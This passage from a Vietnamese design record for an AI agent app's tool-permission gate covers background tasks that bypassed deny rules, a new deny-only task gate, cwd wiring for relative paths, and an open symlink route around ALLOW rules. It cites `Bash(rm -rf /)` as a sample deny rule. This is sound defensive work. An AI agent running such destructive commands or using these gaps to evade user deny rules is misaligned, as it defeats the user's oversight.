**Vì sao không làm (a) theo nghĩa rộng nhất.** "Trả `'ask'` mà có luật DENY cho tool ⇒ bắt hỏi" nghe chặt hơn, nhưng nó gộp hai thứ khác hẳn nhau: *"luật của bạn không nói tới lời gọi này"* (trường hợp thường gặp) và *"cổng không nhìn thấy lời gọi này là gì"*. Bắt cả hai thì **một** luật `Bash(rm -rf /)` biến `execute` mode thành ask-mode cho **mọi** lệnh Bash — người dùng sẽ tắt luật hoặc bỏ chế độ, và một guardrail bị tắt thì bảo vệ được số không. Ranh giới "đọc nổi hay không" là thứ duy nhất vừa kiểm chứng được vừa không phá chế độ.

Nhánh SSH không nhận điều (2): tool SSH thuộc kind `bare` nên chủ thể của chúng luôn đọc được, cờ không bao giờ có thể bật.

### F5 — Tasks bỏ qua toàn bộ cổng quyền (MEDIUM)

**Sai ở đâu.** `runtime/invoke.ts` đặt `beforeToolCall: async () => undefined`, nên node của Task và subagent của Task chạy `Bash`/`Write` **không qua luật nào**. Đây là quyết định cũ (ADR 0024 D-7, tasks chạy không người trực) chứ không phải hồi quy — nhưng ADR 0080 cộng trang Settings → Quyền biến nó thành mâu thuẫn: UI liệt kê luật 3 tầng mà không nói tầng nào không áp cho Tasks.

**Quyết định: bọc bằng cổng CHỈ-DENY** (`makeTaskToolGate` trong `runtime/permission.ts`), đúng đề xuất của infosec. Cổng này `deny ⇒ block`, còn lại ⇒ `undefined`: nó không bao giờ hỏi (không có ai để hỏi), không bao giờ nhớ, và **không có nhánh nào cấp thêm quyền** so với trước — nên nó chỉ có thể thêm chặn, không thể phá một workflow từng chạy được vì lý do quyền. Lỗi nội bộ bất kỳ cũng degrade về `undefined` (hành vi cũ). Luật viết theo tên trần của tool SSH bắc cầu cũng được đối chiếu, y như trong phiên.

Hai giới hạn **phải nói ra**, chứ không được để người dùng tự suy:

- **Task không áp điều (2) của F4.** Lệnh ghép vẫn không khớp luật đơn và ở Task thì được cho qua: không có ai để hỏi, mà chặn mọi `cd x && npm test` chỉ vì tồn tại một luật deny là phá workflow đang chạy được.
- ~~**Đường Anthropic chưa có cổng này.**~~ — **đã xong 2026-09-08.** Cổng đi vào `makeForegroundOnlyHook(gate)` ở `runtime/claude-sdk/shared.ts`, nối tại `claude-sdk/invoke.ts`.

  Đính chính một cách nói sai từng có ở đây: `permissionMode: 'bypassPermissions'` **không phải** thứ bỏ qua cổng. Nhánh chat dùng đúng cờ đó (`claude-sdk/run-stream.ts:646`), có chủ ý, để cổng của SDK không che cổng của AWOG — cổng thật ở nhánh này **luôn** nằm trong hook `PreToolUse`. Đường task chỉ đăng ký một hook KHÁC (`makeForegroundOnlyHook`, vốn là hook viết-lại-input và luôn trả `allow`). Neo finding vào cái cờ là neo sai dòng.

  Vì sao bắt buộc phải đối xứng: runtime chọn **theo provider** (ADR 0058). Để lệch, đổi provider của một agent sang `anthropic` làm luật `deny` của người dùng lặng lẽ hết hiệu lực — cùng một task, cùng một file luật. Bất đối xứng đó do **chính bản vá F5 này** tạo ra khi chỉ sửa một nhánh; nó là một thể hiện nữa của cùng bài học ở F1: vá một tầng mà không xét tầng bên cạnh là cách tạo ra lỗ tiếp theo.

### Việc còn lại sau đính chính lượt 2

- ~~Wire `RuleQuery.cwd` từ cwd THẬT của lượt~~ — **đã xong 2026-09-08.** Nối ở **năm** chỗ, không phải hai: hai đường phiên chat (`runtime/run-stream.ts`, `runtime/claude-sdk/run-stream.ts` → tham số thứ 7 của `makeBeforeToolCall`), hai đường task Pi và một đường task Claude SDK (`makeTaskToolGate(projectId, cwd)`). Cộng một chỗ dễ sót: lần tra DENY **sau khi người dùng ghi đè tham số** cũng phải dùng CÙNG `cwd` — giải theo gốc khác ở đó biến ghi đè thành đường vòng qua đúng luật vừa áp.

  Ngữ nghĩa giữ nguyên: đường dẫn tương đối chỉ có hiệu lực theo chiều DENY dù gốc đến từ đâu. `cwd` chỉ được truyền khi có giá trị thật — `evaluatePermissionRules` phân biệt `undefined` (rơi về đường dẫn project) với `null` (thôi giải đường dẫn tương đối), nên gửi nhầm `null` là âm thầm tắt một nửa luật.

  Đo lại thì tác động **hẹp hơn** mô tả ban đầu ở chiều phiên: thiếu `cwd`, một lời gọi tương đối không dựng nổi chủ thể và phiên **leo thang thành hỏi** (F4) chứ không lặng lẽ chạy — sai ở chỗ hỏi nhầm một thứ người dùng đã cấm tường minh, và lý do hiện ra không nói được luật nào. Chỗ nó thực sự **lọt** là **task**: cổng task cố ý không leo thang (không có ai để hỏi), nên node chạy trong worktree riêng — tức cwd KHÔNG BAO GIỜ là đường dẫn project — cho qua thẳng. Đó là ca test chính của nhóm mới.
- Dư địa: symlink cắm **bên trong** một thư mục đã được ALLOW vẫn chuyển hướng được lời ghi ra ngoài (chiều ALLOW cố ý không `realpath`). Đóng được nếu sau này chuẩn hoá luôn tiền tố literal của pattern, nhưng chi phí là fs I/O trên đường luật.

## Tham chiếu

- Spec: [docs/features/permission-rules.md](../features/permission-rules.md)
- [ADR 0064 — Session ↔ SSH link](./0064-session-ssh-link.md) (cổng SSH giữ allowance riêng)
- [ADR 0060 — per-source scoping](./0060-connections-adopt-craft-sources-model.md) (chặn cứng theo `allowedMcpPatterns`, tầng khác với luật này)
- `.claude/rules/security.md` — invariant 2 (path sanitize) + trust level L1
- Code: `apps/desktop/sidecar/src/sessions/permission-rules.ts`, `src/runtime/permission.ts`, `src/methods/sessions.permission.ts`
